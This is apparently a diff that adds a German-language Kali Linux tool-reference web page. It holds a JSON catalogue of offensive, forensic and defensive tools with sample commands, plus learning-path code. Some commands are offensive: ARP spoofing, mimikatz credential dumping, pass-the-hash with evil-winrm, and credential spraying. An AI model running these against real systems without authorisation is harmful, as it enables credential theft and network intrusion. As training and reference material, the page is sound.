+              "desc": "Interaktiver HTTPS-MitM-Proxy mit Python-Scripting.",
+              "cmd": "mitmproxy -p 8080",
+              "tags": [
+                "MitM",
+                "HTTPS",
+                "Web"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "ettercap",
+              "name": "ettercap",
+              "desc": "Klassischer MitM-Suite für ARP-Poisoning + Filtering.",
+              "cmd": "ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.10//",
+              "tags": [
+                "MitM",
+                "ARP"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "bettercap",
+              "name": "bettercap",
+              "desc": "Modernes MitM-Framework. WiFi + BLE + ARP + HTTP(S).",
+              "cmd": "bettercap -eval 'net.probe on; net.sniff on'",
+              "tags": [
+                "MitM",
+                "Framework"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "arpspoof",
+              "name": "arpspoof",
+              "desc": "ARP-Cache-Poisoning — Klassiker für LAN-MitM.",
+              "cmd": "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1",
+              "tags": [
+                "ARP",
+                "MitM"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "scapy",
+              "name": "scapy",
+              "desc": "Python-Paket-Crafter. Bauen + Senden + Sniffen.",
+              "cmd": "scapy",
+              "tags": [
+                "Scapy",
+                "Packet-Craft"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "post-exploitation",
+          "name": "Post Exploitation",
+          "icon": "🏴",
+          "tools": [
+            {
+              "id": "mimikatz",
+              "name": "mimikatz",
+              "desc": "Windows-Credential-King. Dump LSASS-Hashes, Passwörter, Kerberos-Tickets.",
+              "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords'",
+              "tags": [
+                "Windows",
+                "Creds",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "powershell-empire",
+              "name": "PowerShell-Empire",
+              "desc": "Post-Ex-Framework mit PowerShell-Agents.",
+              "cmd": "empire",
+              "tags": [
+                "PowerShell",
+                "C2"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "evil-winrm",
+              "name": "evil-winrm",
+              "desc": "WinRM-Shell für Windows-Hosts. Pass-the-Hash eingebaut.",
+              "cmd": "evil-winrm -i 10.10.10.5 -u admin -H hash",
+              "tags": [
+                "WinRM",
+                "Windows"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "crackmapexec",
+              "name": "crackmapexec / NetExec",
+              "desc": "Swiss-Army für AD-Pentest. Enumeration, Credential-Spray, Lateral-Movement.",
+              "cmd": "crackmapexec smb 10.10.10.0/24 -u admin -p 'Pass123!'",
+              "tags": [
+                "AD",
+                "SMB",
+                "Lateral"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "impacket-scripts",
+              "name": "impacket-scripts",
+              "desc": "Python-Tools für Windows-Protokolle: psexec, wmiexec, secretsdump.",
+              "cmd": "impacket-psexec domain/user:pass@10.10.10.5",
+              "tags": [
+                "Windows",
+                "AD",
+                "PTH"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "chisel",
+              "name": "chisel",
+              "desc": "TCP/UDP-Tunnel über HTTP. Schnelles Pivoting.",
+              "cmd": "chisel server -p 8000 --reverse",
+              "tags": [
+                "Pivoting",
+                "Tunnel"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "ligolo-ng",
+              "name": "ligolo-ng",
+              "desc": "TUN-basierter Tunnel — einfacher als chisel für Pivoting.",
+              "cmd": "ligolo-proxy -selfcert",
+              "tags": [
+                "Pivoting",
+                "Tunnel"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "bloodhound",
+              "name": "BloodHound",
+              "desc": "Visualisiert AD-Attack-Paths. SharpHound sammelt Daten.",
+              "cmd": "bloodhound-python -u user -p pass -d domain.local -ns 10.10.10.5",
+              "tags": [
+                "AD",
+                "Graph",
+                "Visual"
+              ],
+              "pop": "gold"
+            }
+          ]
+        },
+        {
+          "id": "reporting",
+          "name": "Reporting Tools",
+          "icon": "📝",
+          "tools": [
+            {
+              "id": "cutycapt",
+              "name": "cutycapt",
+              "desc": "Screenshot-Tool für Webseiten (für Pentest-Berichte).",
+              "cmd": "cutycapt --url=https://target.com --out=shot.png",
+              "tags": [
+                "Screenshot",
+                "Web"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "recordmydesktop",
+              "name": "recordmydesktop",
+              "desc": "Desktop-Recorder für Demonstrationen.",
+              "cmd": "recordmydesktop",
+              "tags": [
+                "Recording",
+                "Demo"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "cherrytree",
+              "name": "CherryTree",
+              "desc": "Hierarchischer Notiz-Editor mit Syntax-Highlighting und Medien.",
+              "cmd": "cherrytree",
+              "tags": [
+                "Notes",
+                "Hierarchy"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "dradis",
+              "name": "Dradis",
+              "desc": "Reporting-Framework für Pentest-Teams. Kollaborativ.",
+              "cmd": "dradis-start",
+              "tags": [
+                "Reporting",
+                "Collab"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "maltego",
+              "name": "maltego",
+              "desc": "Visualisiert Recon- und Threat-Intelligence-Daten.",
+              "cmd": "maltego",
+              "tags": [
+                "OSINT",
+                "Visual",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "pipal",
+              "name": "pipal",
+              "desc": "Passwort-Wortlisten-Analysator — Statistiken + Wortverteilung.",
+              "cmd": "pipal wordlist.txt",
+              "tags": [
+                "Wordlist",
+                "Stats"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "obsidian",
+              "name": "obsidian",
+              "desc": "Markdown-basierter Notiz-Editor für Knowledge-Graph-Pentest-Berichte.",
+              "cmd": "obsidian",
+              "tags": [
+                "Notes",
+                "Graph"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "forensik",
+          "name": "Forensics",
+          "icon": "🔬",
+          "tools": [
+            {
+              "id": "guymager",
+              "name": "guymager",
+              "num": 1,
+              "cmd": "guymager",
+              "desc": "GUI-Klassiker für Disk-Imaging. Multi-threaded, parallel MD5/SHA1/SHA256. Generiert dd, E01 und AFF.",
+              "tags": [
+                "GUI",
+                "E01",
+                "AFF",
+                "Hash"
+              ],
+              "pop": "daily",
+              "audioJump": 0,
+              "audioTime": "0:00"
+            },
+            {
+              "id": "dc3dd",
+              "name": "dc3dd",
+              "num": 2,
+              "cmd": "dc3dd if=/dev/sda of=image.dd hash=sha256",
+              "desc": "Patch des klassischen dd mit Forensik-Features. CLI-basiert, skriptbar, mit Hash-Berechnung.",
+              "tags": [
+                "CLI",
+                "dd",
+                "Skriptbar"
+              ],
+              "pop": "classic",
+              "audioJump": 100,
+              "audioTime": "1:40"
+            },
+            {
+              "id": "ewfacquire",
+              "name": "ewfacquire",
+              "num": 3,
+              "cmd": "ewfacquire -t case01 /dev/sdb",
+              "desc": "Teil von libewf, spezialisiert auf E01-Format. Schreibt Case-Info direkt in den Header.",
+              "tags": [
+                "E01",
+                "libewf",
+                "Court-ready"
+              ],
+              "pop": "special",
+              "audioJump": 125,
+              "audioTime": "2:05"
+            },
+            {
+              "id": "autopsy",
+              "name": "autopsy",
+              "num": 4,
+              "cmd": "autopsy",
+              "desc": "End-to-end open-source forensics platform von Sleuth Kit Labs. GUI mit Plug-in-Architektur auf Python/Sleuth-Kit-Basis.",
+              "tags": [
+                "GUI",
+                "Cases",
+                "Tags",
+                "Reporting"
+              ],
+              "pop": "daily",
+              "audioJump": 150,
+              "audioTime": "2:30"
+            },
+            {
+              "id": "sleuthkit",
+              "name": "sleuthkit",
+              "num": 5,
+              "cmd": "fls -r image.raw | head -50",
+              "desc": "~30 CLI-Binaries: mmls, fsstat, fls, icat, mactime. Engine unter Autopsy, mächtiger für Skripte.",
+              "tags": [
+                "CLI",
+                "Skriptbar",
+                "Batch"
+              ],
+              "pop": "daily",
+              "audioJump": 200,
+              "audioTime": "3:20"
+            },
+            {
+              "id": "blkls",
+              "name": "blkls",
+              "num": 6,
+              "cmd": "blkls image.raw > unallocated.bin",
+              "desc": "Listet unallokierte Blöcke einer Disk. Rohmaterial für File-Carving-Tools.",
+              "tags": [
+                "Sleuth-Kit",
+                "Unallocated"
+              ],
+              "pop": "standard",
+              "audioJump": 266,
+              "audioTime": "4:26"
+            },
+            {
+              "id": "tsk_recover",
+              "name": "tsk_recover",
+              "num": 7,
+              "cmd": "tsk_recover -i image.raw -o recovered/",
+              "desc": "Exportiert Files aus einem Image in einen Zielordner. Bulk-Export via Inode-Liste.",
+              "tags": [
+                "Sleuth-Kit",
+                "Bulk-Export"
+              ],
+              "pop": "standard",
+              "audioJump": 280,
+              "audioTime": "4:40"
+            },
+            {
+              "id": "foremost",
+              "name": "foremost",
+              "num": 8,
+              "cmd": "foremost -i image.raw -o carved/ -T",
+              "desc": "Original von US Air Force OSI. Header/Footer-basiert. Audit-Log mit Offsets und Größen.",
+              "tags": [
+                "Header/Footer",
+                "Audit-Log"
+              ],
+              "pop": "classic",
+              "audioJump": 296,
+              "audioTime": "4:56"
+            },
+            {
+              "id": "scalpel",
+              "name": "scalpel",
+              "num": 9,
+              "cmd": "scalpel -b -o carved/ image.raw",
+              "desc": "Schneller als foremost, optimiert für Terrabyte-Images. C-basiert, multi-threaded.",
+              "tags": [
+                "High-Speed",
+                "Terrabyte"
+              ],
+              "pop": "special",
+              "audioJump": 332,
+              "audioTime": "5:32"
+            },
+            {
+              "id": "photorec",
+              "name": "photorec",
+              "num": 10,
+              "cmd": "photorec /d recovered/ image.raw",
+              "desc": "Ignoriert Filesystem komplett. 400+ Dateiformate erkannt. Mit Testdisk unschlagbar.",
+              "tags": [
+                "Filesystem-agnostisch",
+                "400+-Formate"
+              ],
+              "pop": "daily",
+              "audioJump": 362,
+              "audioTime": "6:02"
+            },
+            {
+              "id": "extundelete",
+              "name": "extundelete",
+              "num": 11,
+              "cmd": "extundelete /dev/sda1 --restore-all",
+              "desc": "Eng spezialisiert auf ext3/ext4. Liest Journal-Informationen aus und stellt gelöschte Files wieder her.",
+              "tags": [
+                "ext3",
+                "ext4",
+                "Journal"
+              ],
+              "pop": "special",
+              "audioJump": 396,
+              "audioTime": "6:36"
+            },
+            {
+              "id": "safecopy",
+              "name": "safecopy",
+              "num": 12,
+              "cmd": "safecopy --stage1 /dev/sdb image_rescue.dd",
+              "desc": "Wenn die Disk physisch beschädigt ist. Drei Stufen: rescue, lean, alles. Robuster als dd.",
+              "tags": [
+                "Defekt-resistent",
+                "Recovery"
+              ],
+              "pop": "special",
+              "audioJump": 425,
+              "audioTime": "7:05"
+            },
+            {
+              "id": "scrounge-ntfs",
+              "name": "scrounge-ntfs",
+              "num": 13,
+              "cmd": "scrounge-ntfs /dev/sda1",
+              "desc": "Spezialisiert auf NTFS-Volumes. Hilft bei nicht mehr mountbaren Partitionen und I/O-Fehlern.",
+              "tags": [
+                "NTFS",
+                "Windows"
+              ],
+              "pop": "special",
+              "audioJump": 466,
+              "audioTime": "7:46"
+            },
+            {
+              "id": "volatility",
+              "name": "volatility",
+              "num": 14,
+              "cmd": "vol -f memdump.raw windows.info",
+              "desc": "Goldstandard der Memory-Forensik. Plugin-basiert: pslist, netscan, filescan, malfind.",
+              "tags": [
+                "RAM-Dump",
+                "Python3",
+                "Plugin"
+              ],
+              "pop": "gold",
+              "audioJump": 498,
+              "audioTime": "8:18"
+            },
+            {
+              "id": "bulk_extractor",
+              "name": "bulk_extractor",
+              "num": 15,
+              "cmd": "bulk_extractor -o output/ memdump.raw",
+              "desc": "Simson Garfinkel. Findet Kreditkarten, Emails, URLs, Bitcoin-Adressen, EXIF. Multi-threaded.",
+              "tags": [
+                "PII",
+                "Multi-threaded",
+                "Pattern"
+              ],
+              "pop": "daily",
+              "audioJump": 566,
+              "audioTime": "9:26"
+            },
+            {
+              "id": "binwalk",
+              "name": "binwalk",
+              "num": 16,
+              "cmd": "binwalk firmware.bin",
+              "desc": "Firmware-Analyse. Findet eingebettete Files und Filesysteme (SquashFS, CramFS, JPEGs).",
+              "tags": [
+                "Firmware",
+                "IoT",
+                "Embedded"
+              ],
+              "pop": "standard",
+              "audioJump": 618,
+              "audioTime": "10:18"
+            },
+            {
+              "id": "missidentify",
+              "name": "missidentify",
+              "num": 17,
+              "cmd": "missidentify /suspicious/dir",
+              "desc": "Ergänzung zu binwalk. Findet Files mit falschen Extensions, getarnten Magic-Bytes.",
+              "tags": [
+                "Tarnung-Erkennung",
+                "Obfuscated"
+              ],
+              "pop": "special",
+              "audioJump": 654,
+              "audioTime": "10:54"
+            },
+            {
+              "id": "yara",
+              "name": "yara",
+              "num": 18,
+              "cmd": "yara -r rules.yar /target/dir",
+              "desc": "Pattern-Matching-Swiss-Knife von VirusTotal. Industrie-Standard für Malware-Identifikation.",
+              "tags": [
+                "Pattern",
+                "Rules",
+                "Industry-Standard"
+              ],
+              "pop": "daily",
+              "audioJump": 694,
+              "audioTime": "11:34"
+            },
+            {
+              "id": "hashdeep",
+              "name": "hashdeep",
+              "num": 19,
+              "cmd": "hashdeep -r /target/dir -c md5,sha1,sha256",
+              "desc": "Compute-und-Verify. Multi-Hashing. Abgleich gegen NSRL oder eigene Known-Bad-Listen.",
+              "tags": [
+                "Hash",
+                "NSRL",
+                "Audit"
+              ],
+              "pop": "standard",
+              "audioJump": 735,
+              "audioTime": "12:15"
+            },
+            {
+              "id": "ssdeep",
+              "name": "ssdeep",
+              "num": 20,
+              "cmd": "ssdeep -r /target/dir > hashes.txt",
+              "desc": "Fuzzy-Hashing. Erkennt ähnliche Files, wo klassische Hashes versagen. Für Malware-Varianten.",
+              "tags": [
+                "Fuzzy",
+                "Varianten"
+              ],
+              "pop": "special",
+              "audioJump": 774,
+              "audioTime": "12:54"
+            },
+            {
+              "id": "chkrootkit",
+              "name": "chkrootkit",
+              "num": 21,
+              "cmd": "chkrootkit",
+              "desc": "Rootkit-Detector. Prüft Signaturen bekannter Rootkits in System-Binaries. Schnelle Live-Triage.",
+              "tags": [
+                "Rootkit",
+                "Live-Triage"
+              ],
+              "pop": "standard",
+              "audioJump": 812,
+              "audioTime": "13:32"
+            },
+            {
+              "id": "rkhunter",
+              "name": "rkhunter",
+              "num": 22,
+              "cmd": "rkhunter --check --sk",
+              "desc": "Modernere Rootkit-Detection. Umfangreiche Signatur-DB plus File-Integrity-Checking.",
+              "tags": [
+                "Rootkit",
+                "File-Integrity"
+              ],
+              "pop": "standard",
+              "audioJump": 822,
+              "audioTime": "13:42"
+            },
+            {
+              "id": "pdfid",
+              "name": "pdfid",
+              "num": 23,
+              "cmd": "pdfid suspicious.pdf",
+              "desc": "Didier Stevens. Scannt PDF-Objekte in Millisekunden. Zeigt JavaScript, OpenAction, versteckte Forms.",
+              "tags": [
+                "PDF",
+                "Quick-Scan"
+              ],
+              "pop": "standard",
+              "audioJump": 868,
+              "audioTime": "14:28"
+            },
+            {
+              "id": "pdf-parser",
+              "name": "pdf-parser",
+              "num": 24,
+              "cmd": "pdf-parser.py suspicious.pdf | head -100",
+              "desc": "Detail-Stufe. Kompletter Objekt-Tree, Streams, Cross-References. Liest obfuscated JavaScript im Klartext.",
+              "tags": [
+                "PDF",
+                "Deep-Analysis"
+              ],
+              "pop": "special",
+              "audioJump": 892,
+              "audioTime": "14:52"
+            }
+          ]
+        }
+      ]
+    },
+    "purple": {
+      "label": "Purple Team — Defensive",
+      "icon": "🟣",
+      "shortLabel": "Purple",
+      "categories": [
+        {
+          "id": "govern",
+          "name": "Govern (NIST CSF)",
+          "icon": "⚖️",
+          "tools": [
+            {
+              "id": "gvm",
+              "name": "gvm (Greenbone)",
+              "desc": "Vulnerability-Management + Compliance-Reports (CIS, PCI).",
+              "cmd": "gvm-start && https://localhost:9392",
+              "tags": [
+                "Compliance",
+                "Vuln",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "openvas",
+              "name": "OpenVAS",
+              "desc": "Open-Source-Vulnerability-Scanner (Kern von GVM).",
+              "cmd": "openvas-start",
+              "tags": [
+                "Vulnerability"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "lynis",
+              "name": "lynis",
+              "desc": "Host-basierter Audit für Härtung und Compliance.",
+              "cmd": "lynis audit system --report-file report.txt",
+              "tags": [
+                "Audit",
+                "Compliance"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "openscap",
+              "name": "OpenSCAP",
+              "desc": "Security-Content-Automation-Protocol — CIS/STIG-Compliance.",
+              "cmd": "oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_standard /usr/share/xml/scap/ssg/content/ssg-deb12-ds.xml",
+              "tags": [
+                "SCAP",
+                "Compliance"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "defectdojo",
+              "name": "DefectDojo",
+              "desc": "Vulnerability-Management-Platform — korreliert Scans über Teams.",
+              "cmd": "defectdojo-start",
+              "tags": [
+                "VulnMgmt",
+                "Reporting"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "dradis",
+              "name": "Dradis",
+              "desc": "Kollaboratives Reporting-Framework für Assessments.",
+              "cmd": "dradis-start",
+              "tags": [
+                "Reporting",
+                "Collab"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "identify",
+          "name": "Identify (NIST CSF)",
+          "icon": "🔍",
+          "tools": [
+            {
+              "id": "nmap",
+              "name": "nmap",
+              "desc": "Asset-Discovery und Service-Fingerprinting.",
+              "cmd": "nmap -sn 10.10.10.0/24",
+              "tags": [
+                "Recon",
+                "Asset",
+                "Daily"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "gvm",
+              "name": "gvm (Greenbone)",
+              "desc": "Schwachstellen-Scan über alle Assets.",
+              "cmd": "gvm-cli --gmp-username admin tls-cred 'get_reports'",
+              "tags": [
+                "Vuln-Scan",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "nikto",
+              "name": "nikto",
+              "desc": "Webserver-Schwachstellen-Identifikation.",
+              "cmd": "nikto -h https://target.com",
+              "tags": [
+                "Web",
+                "Vuln-Scan"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "legion",
+              "name": "legion",
+              "desc": "GUI-Vulnerability-Scanner mit Multi-Tool-Integration.",
+              "cmd": "legion",
+              "tags": [
+                "GUI",
+                "Scanner"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "autorecon",
+              "name": "autorecon",
+              "desc": "Multi-threaded-Recon — erkennt automatisch Services + Tests.",
+              "cmd": "autorecon 10.10.10.5",
+              "tags": [
+                "Recon",
+                "Automated"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "masscan",
+              "name": "masscan",
+              "desc": "Schneller Host/Port-Discovery für große Netze.",
+              "cmd": "masscan -p1-65535 10.0.0.0/8 --rate=10000",
+              "tags": [
+                "Discovery",
+                "Fast"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "protect",
+          "name": "Protect (NIST CSF)",
+          "icon": "🛡️",
+          "tools": [
+            {
+              "id": "ufw",
+              "name": "UFW",
+              "desc": "Uncomplicated Firewall — einfaches iptables-Frontend.",
+              "cmd": "ufw allow 22/tcp && ufw enable",
+              "tags": [
+                "Firewall",
+                "Linux"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "iptables",
+              "name": "iptables",
+              "desc": "Klassische Linux-Firewall. Granulares Paketfiltering.",
+              "cmd": "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+              "tags": [
+                "Firewall",
+                "Linux"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "fail2ban",
+              "name": "fail2ban",
+              "desc": "Blockiert IPs nach fehlgeschlagenen Login-Versuchen.",
+              "cmd": "fail2ban-client status sshd",
+              "tags": [
+                "Bruteforce",
+                "Defense"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "apparmor",
+              "name": "AppArmor",
+              "desc": "Mandatory-Access-Control — Prozess-Sandboxing.",
+              "cmd": "aa-status",
+              "tags": [
+                "MAC",
+                "Linux"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "selinux",
+              "name": "SELinux",
+              "desc": "Mandatory-Access-Control — RHEL/Fedora-Standard.",
+              "cmd": "sestatus",
+              "tags": [
+                "MAC",
+                "RHEL"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "opnsense",
+              "name": "OPNsense",
+              "desc": "Open-Source-NGFW. Stateful + IDS/IPS + VPN.",
+              "cmd": "opnsense",
+              "tags": [
+                "NGFW",
+                "Network"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "openssh",
+              "name": "OpenSSH",
+              "desc": "Verschlüsselter Remote-Zugang mit starken Auth-Methoden.",
+              "cmd": "ssh -o PubkeyAuthentication=yes user@host",
+              "tags": [
+                "SSH",
+                "Encryption"
+              ],
+              "pop": "daily"
+            }
+          ]
+        },
+        {
+          "id": "detect",
+          "name": "Detect (NIST CSF)",
+          "icon": "🚨",
+          "tools": [
+            {
+              "id": "suricata",
+              "name": "Suricata",
+              "desc": "High-Performance-IDS/IPS/NSM. Multi-Threaded + Emerging-Threats-Rules.",
+              "cmd": "suricata -c /etc/suricata/suricata.yaml -i eth0",
+              "tags": [
+                "IDS",
+                "IPS",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "zeek",
+              "name": "Zeek (Bro)",
+              "desc": "Network-Security-Monitor. 70+ Log-Formate für tiefe Analyse.",
+              "cmd": "zeekctl deploy",
+              "tags": [
+                "NSM",
+                "Logs"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "arkime",
+              "name": "Arkime (Moloch)",
+              "desc": "Full-Packet-Capture + Index + Search. Cluster-fähig.",
+              "cmd": "arkime-config",
+              "tags": [
+                "PCAP",
+                "Search"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "wazuh",
+              "name": "Wazuh",
+              "desc": "Open-Source SIEM + XDR. Endpoint + Log + Compliance.",
+              "cmd": "wazuh-manager-start",
+              "tags": [
+                "SIEM",
+                "XDR"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "osquery",
+              "name": "osquery",
+              "desc": "Endpoint-Telemetrie via SQL. Fleet-Management mit Kolide/KFleet.",
+              "cmd": "osqueryi",
+              "tags": [
+                "Endpoint",
+                "SQL"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "falco",
+              "name": "Falco",
+              "desc": "Runtime-Security-Detection mit eBPF. Container/K8s-nativ.",
+              "cmd": "falco -k https://your-api-key",
+              "tags": [
+                "Runtime",
+                "eBPF",
+                "Containers"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "snort",
+              "name": "Snort",
+              "desc": "Klassisches IDS/IPS. Riesige Community-Rules.",
+              "cmd": "snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0",
+              "tags": [
+                "IDS",
+                "IPS"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "elastic-security",
+              "name": "Elastic Security",
+              "desc": "SIEM + EDR auf Elasticsearch-Basis. KI-gestützte Detection.",
+              "cmd": "elastic-agent enroll",
+              "tags": [
+                "SIEM",
+                "EDR"
+              ],
+              "pop": "gold"
+            }
+          ]
+        },
+        {
+          "id": "respond",
+          "name": "Respond (NIST CSF)",
+          "icon": "🛠️",
+          "tools": [
+            {
+              "id": "thehive",
+              "name": "TheHive",
+              "desc": "Incident-Response-Platform. Cases + Tasks + Observables.",
+              "cmd": "thehive-start",
+              "tags": [
+                "IR",
+                "Case-Mgmt",
+                "Gold"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "cortex",
+              "name": "Cortex",
+              "desc": "Observable-Analyse-Engine (Anbindung an TheHive).",
+              "cmd": "cortex",
+              "tags": [
+                "IR",
+                "Analysis"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "velociraptor",
+              "name": "Velociraptor",
+              "desc": "Endpoint-Forensik + Threat-Hunting via VQL.",
+              "cmd": "velociraptor-client",
+              "tags": [
+                "DFIR",
+                "Endpoint"
+              ],
+              "pop": "gold"
+            },
+            {
+              "id": "cyberchef",
+              "name": "CyberChef",
+              "desc": "Cyber Swiss-Army-Knife. Daten-Dekodierung + -Transformation.",
+              "cmd": "cyberchef",
+              "tags": [
+                "Data",
+                "Decode"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "wazuh",
+              "name": "Wazuh",
+              "desc": "Active-Response-Modul: automatische Containment-Aktionen.",
+              "cmd": "wazuh-manager",
+              "tags": [
+                "SIEM",
+                "Response"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "grr",
+              "name": "GRR Rapid Response",
+              "desc": "Google-Endpoint-Forensik-Framework. Live-Remote-Triage.",
+              "cmd": "grr_server",
+              "tags": [
+                "DFIR",
+                "Google"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "misp",
+              "name": "MISP",
+              "desc": "Threat-Intelligence-Sharing-Platform. IOC-Verwaltung.",
+              "cmd": "misp-start",
+              "tags": [
+                "CTI",
+                "IOC"
+              ],
+              "pop": "standard"
+            }
+          ]
+        },
+        {
+          "id": "recover",
+          "name": "Recover (NIST CSF)",
+          "icon": "♻️",
+          "tools": [
+            {
+              "id": "dd",
+              "name": "dd",
+              "desc": "Bit-für-Bit Disk-Image und Restore.",
+              "cmd": "dd if=/dev/sda of=image.dd bs=4M status=progress",
+              "tags": [
+                "Imaging",
+                "Classic"
+              ],
+              "pop": "classic"
+            },
+            {
+              "id": "rsync",
+              "name": "rsync",
+              "desc": "Inkrementelles Backup mit Delta-Transfer.",
+              "cmd": "rsync -avz /data/ backup:/backup/",
+              "tags": [
+                "Backup",
+                "Sync"
+              ],
+              "pop": "daily"
+            },
+            {
+              "id": "testdisk",
+              "name": "testdisk",
+              "desc": "Partitions- und Bootsektor-Recovery.",
+              "cmd": "testdisk /dev/sda",
+              "tags": [
+                "Recovery",
+                "Partition"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "photorec",
+              "name": "photorec",
+              "desc": "File-Carving — rekonstruiert gelöschte Files aus Disk-Images.",
+              "cmd": "photorec /dev/sda",
+              "tags": [
+                "Recovery",
+                "Carving"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "clonezilla",
+              "name": "Clonezilla",
+              "desc": "Disk-Cloning und -Imaging für Bare-Metal-Recovery.",
+              "cmd": "clonezilla-start",
+              "tags": [
+                "Imaging",
+                "Bare-Metal"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "borgbackup",
+              "name": "BorgBackup",
+              "desc": "Dedupliziertes, verschlüsseltes Backup mit Versionierung.",
+              "cmd": "borg create /backup::archive-$(date -I) /data",
+              "tags": [
+                "Backup",
+                "Dedupe"
+              ],
+              "pop": "standard"
+            },
+            {
+              "id": "restic",
+              "name": "restic",
+              "desc": "Sichere, versionierte Backups mit Ende-zu-Ende-Verschlüsselung.",
+              "cmd": "restic -r /backup backup /data",
+              "tags": [
+                "Backup",
+                "Encrypted"
+              ],
+              "pop": "standard"
+            }
+          ]
+        }
+      ]
+    }
+  }
+}
+  </script>
+
+  <script>
+    const DB = JSON.parse(document.getElementById('tool-db').textContent);
+
+// ═══ MODE STATE ═══
+const MODE_KEY = 'kali-mode';
+let currentMode = localStorage.getItem(MODE_KEY) || 'blue';
+
+function getCategories() { return DB.modes[currentMode].categories; }
+function getAllTools() { return getCategories().flatMap(c => c.tools); }
+function getCategory(id) { return getCategories().find(c => c.id === id); }
+function getModeInfo() { return DB.modes[currentMode]; }
+function totalTools() { return getAllTools().length; }
+
+// ═══ STATE (moved here to avoid TDZ errors) ═══
+const FAV_KEY = 'forensik-favs';
+function loadFavorites() {
+  try { return new Set(JSON.parse(localStorage.getItem(FAV_KEY) || '[]')); }
+  catch(e) { return new Set(); }
+}
+function saveFavorites() {
+  localStorage.setItem(FAV_KEY, JSON.stringify([...favorites]));
+}
+let favorites = loadFavorites();
+// Comparator state
+const compareSet = new Set();
+const MAX_COMPARE = 4;
+let activePlaybook = null;
+// Filter state
+let currentCategory = 'all';
+let currentSearch = '';
+let favOnly = false;
+
+// ═══ LEARNING PATHS ═══
+const learningPaths = [
+  {
+    id: 'pentest-zero', icon:'⚔️', name:'Pentest von Null', duration:'4 Wochen',
+    desc:'Vom kompletten Anfänger zum ersten eigenen Pentest. Schritt-für-Schritt Lernpfad.',
+    weeks: [
+      {title:'Woche 1: Netzwerk-Grundlagen', goal:'Verstehe wie Netzwerke funktionieren, lerne nmap kennen.', tools:['nmap','wireshark','masscan'], done:false},
+      {title:'Woche 2: Web-Anwendungen', goal:'HTTP-Protokoll, Web-Scanning, erste Schwachstellen.', tools:['burpsuite','nikto','gobuster','ffuf'], done:false},
+      {title:'Woche 3: Exploitation', goal:'Nutzung von Schwachstellen, Metasploit, erste Shells.', tools:['metasploit','sqlmap','searchsploit'], done:false},
+      {title:'Woche 4: Post-Exploitation', goal:'Privilege Escalation, Lateral Movement, Reporting.', tools:['mimikatz','powershell-empire','evil-winrm'], done:false},
+    ]
+  },
+  {
+    id: 'soc-basics', icon:'\uD83D\uDC41\uFE0F', name:'SOC Analyst Basics', duration:'3 Wochen',
+    desc:'Lerne, wie ein Security Operations Center funktioniert — Monitoring, Detection, Response.',
+    weeks: [
+      {title:'Woche 1: Monitoring-Grundlagen', goal:'Verstehe SIEM, Logs, NetFlow. Richte erste Dashboards ein.', tools:['wireshark','zeek','suricata'], done:false},
+      {title:'Woche 2: Endpoint & Threat Detection', goal:'Endpoint-Telemetry, IOCs, erste Regeln schreiben.', tools:['osquery','wazuh','yara'], done:false},
+      {title:'Woche 3: Incident Response', goal:'Vorfall-Analyse, Triage, Containment. NIST IR Framework.', tools:['velociraptor','thehive','cyberchef'], done:false},
+    ]
+  },
+  {
